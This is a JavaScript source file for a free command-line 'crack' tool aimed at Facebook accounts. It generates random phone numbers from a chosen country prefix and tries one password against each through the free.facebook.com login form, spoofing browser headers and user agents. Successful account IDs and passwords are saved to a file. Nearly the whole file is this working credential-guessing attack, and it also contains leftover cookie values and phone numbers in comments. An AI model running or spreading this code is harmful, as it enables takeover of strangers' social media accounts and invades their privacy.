//var request = require('request');
import axios from 'axios';
import request from 'request';
import cookie from 'cookie';
import ua from 'user-agents';
import chalk from 'chalk';
import { rand } from './random.js';
import fs from 'fs';
import clear from 'console-clear';
import readline from 'readline';
import prompt from 'prompt-sync';
import parser from 'set-cookie-parser';
clear()
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
//startFile()
/*rl.question(chalk.blue('What is your name? '), (answer) => {
  console.log(`Oh, so your name is ${answer}`);
  return;
});*/

const line = "======================================"
let logo = (chalk.bold(`
    ######                                
    #     #  ####  #    # #    # # ###### 
    #     # #    # ##   # ##   # # #      
    ######  #    # # #  # # #  # # #####  
    #   #   #    # #  # # #  # # # #      
    #    #  #    # #   ## #   ## # #      
    #     #  ####  #    # #    # # ###### \n
    ${line}\n      Author: Ronnie
      Version: 1.0 
      GitHub: Ohanronnie
      Type: ${chalk.green.bold("Free")}\n    ${line}
`));
console.log(logo)
let l,m;
l = 1;
m = 0;
let oks =0;
let id = "";
let passWord = "";
let code = "";
rl.question(chalk.hex("#008FFF")("\n    Enter crack limit (max: 2000)?:  "), (e)=>{
  id = e;
  rl.close();
  d()
});
//rl.question(chalk.hex("yellow")("\n Enter password: "), (e) => {
//  rl.close();
  function d(){
//    console.log('\n');
    passWord = prompt({SIGINT: true})(chalk.hex('#0F12FA').bold("    Enter password: "));
    if(passWord === null || passWord.length < 6) throw new TypeError('Password field cannot be lesser than 6');
    code = prompt({SIGINT: true})(chalk.hex("##008FFF")("    Enter code (example: 92301,92305,etc)?: "));
  startFile();
  clear()
  console.log(logo);
  let pass = fs.readFileSync('./brute.txt').toString().trim();
  console.log(chalk.yellow.bold("    Total account: ")+chalk.red.bold(pass.split("\n").length));
  console.log(chalk.yellow.bold("    Password: ") + chalk.red.bold(passWord));
  console.log(chalk.yellow.bold("    Code you choose: ") + chalk.red.bold(code));
  console.log(`\n    ${line}  \n`)
  start()
//})
}
//let req = request.defaults({_jar: true});
//let l = 1,m=0;
//start()
function change(...arg){
  let fixed = arg[arg.length - 1].split(" ");
  let fixVal = arg[arg.length -1].trim();
  let [first,last] = [fixed?.[0]?.trim(),fixed?.[1]?.trim()];
  let arr = [];
  for(let i = 0; i<= arg.length - 2; i++){
    let temp;
    temp = arg[i].replace(/first/g,first);
    temp = temp.replace(/last/g,last);
    arr.push(temp)
  }
  console.log(arr)
}
/*change("firstlast","first",'lastfirst','firstlast123','firstlast@first',"Adedayo Gbenga");*/
/*function ask(question){
  let p = prompt({SIGINT: true});
  let ans = p(question);
  return ans
}*/
async function crack(pass,num,agent){
  let req = request.defaults({_jar: true});
  let cok = [];
  let free = await axios.get('https://free.facebook.com');
  free.headers['set-cookie'].forEach(e => cok.push(e.split(';')[0]));
  let r = req.jar();
var headers = {
    'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': /*'sb=7NjsY8LI6XVRUXkDdgGiVpue; datr=79jsY14nlszu-jELMlGKgeCm; fr=0WW7TV1DotAPC7H0M..Bj7Njs.7v.AAA.0.0.BkBME7.AWUxfngGO58'*/ cok.join('; ') ,
    'origin': 'https://free.facebook.com',
    'referer': 'https://free.facebook.com/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': agent
};

var dataString = /*`lsd=${free.data.match('name="lsd" value="(.*?)"')[1]}&jazoest=${free.data.match('name="jazoest" value="(.*?)"')[1]}&m_ts=${free.data.match('name="m_ts" value="(.*?)"')[1]}&li=${free.data.match('name="li" value="(.*?)"')[1]}&try_number=0&unrecognized_tries=0&email=${num}&pass=${pass}&login=Log+In&bi_xrwh=0`*/ `lsd=${free.data.match('name="lsd" value="(.*?)"')[1]}&jazoest=${free.data.match('name="jazoest" value="(.*?)"')[1]}&m_ts=${free.data.match('name="m_ts" value="(.*?)"')[1]}&li=${free.data.match('name="li" value="(.*?)"')[1]}&try_number=0&unrecognized_tries=0&email=${num}&pass=${pass}&login=Log+In&bi_xrwh=0`;

var options = {
    url: 'https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
 //   url: `https://free.facebook.com/login/device-based/password/??refsrc=deprecated`,
    method: 'POST',
    headers: headers,
    body: dataString,
    jar: r
};
function callback(error, response, body) {
    let cok_parse = parser.parse(response);
    let isCheck = cok_parse.find(e => e.name === 'checkpoint');
    isCheck && console.log(chalk.red.bold(`[OH-CP] ${num} | ${pass}`));
    if (!error && response.statusCode == 200) {
    }
  if(response){
    process.stdout.write(chalk.blue.bold(`\r [OK-${oks}][${l}/${m}]`));
    if(l !== m){
      l++;
//      console.log(response)
    } else {
      console.log(chalk.green.bold("\n Process completed"));
      process.exit()
    }
  }
        //z = Date.now()
    
    let y = response?.headers?.["set-cookie"]?.[2] && cookie.parse(response.headers["set-cookie"][2]);
//    console.log(response)
//   fs.writeFileSync(num,`${JSON.stringify(response?.headers,null,2)}`);
  if(y && y.c_user){
    oks++;
    console.log(chalk.green.bold(`[OH-OK] ${y.c_user} | ${pass}`));
  //  console.log(chalk.blue.bold(cok_parse.map(e => `${e.name}=${e.value}`).join('; ')))
//    console.log(response.toJSON());
    
    fs.appendFileSync('oh.txt',`${y.c_user} | ${pass} \n`);
/*    if(response){
      process.stdout.write(`\r ${l} / ${m}`);
      l++;
    }*/
  }
}
let c = req(options, callback);
return 8;
}
//crack("Ehisunoria","2348165743175",new ua().data.userAgent)

/*while (i !== 1000){
  (async ()=>{
  let n = `${23480}${rand(8)}`;
  process.stdout.write('\r '+i+' / '+1000);
  fs.appendFileSync('a.txt',"\n"+n);
  let y = await crack('Ayomide',n,new ua().data.userAgent);
    console.log(y)
    y && i++;
})()
}*/
function startFile(){
  let num = [1,2,3,4,5,6,7,8,9,0];
  fs.writeFileSync("./brute.txt","");
  for(let i = 0; i<= id; i++){
    let t = code;
    for(let j = 0; j< 7; j++){
       t += String(num[Math.floor(Math.random() * num.length)]);
    }
    fs.appendFileSync('./brute.txt',t + "\n")
  }
}
async function start(){
//  fs.writeFileSync('./brute.txt',"");
  let file = fs.readFileSync('./brute.txt').toString().trim();
  let data = file.split('\n');
  let arrof = [1,2,3,4,5,6,7,8,9,0];
//  let all = [];
//  data.forEach(e => all.push(e.split('|')));
  let obj = [];
/*  data.forEach(e => {
    obj.push({
      mail: e,
      pass: passWord
    })
  });*/
  for(let q = 0; q<= id; q++){
    let tmp = code;
  for(let j = 0; j< 7; j++){
    tmp += arrof[Math.floor(Math.random() * arrof.length)];
  }
    m = q.length;
    let x = await crack(passWord,tmp,new ua().data.userAgent);
    
    //process.stdout.write(chalk.yellow('\r '+ a + ' / ' + f.length))
  
  }
//  process.stdout.write('\r '+ a + ' / '+1000);

//  let y = await crack("Ayomide",n,new ua().data.userAgent);
//  fs.appendFileSync("t.txt","Ayomide  |"+ "|  "+ n + "\n")
  /*if(a !== 1000){
    
    start()
  }*/
  //start();
}

//star()
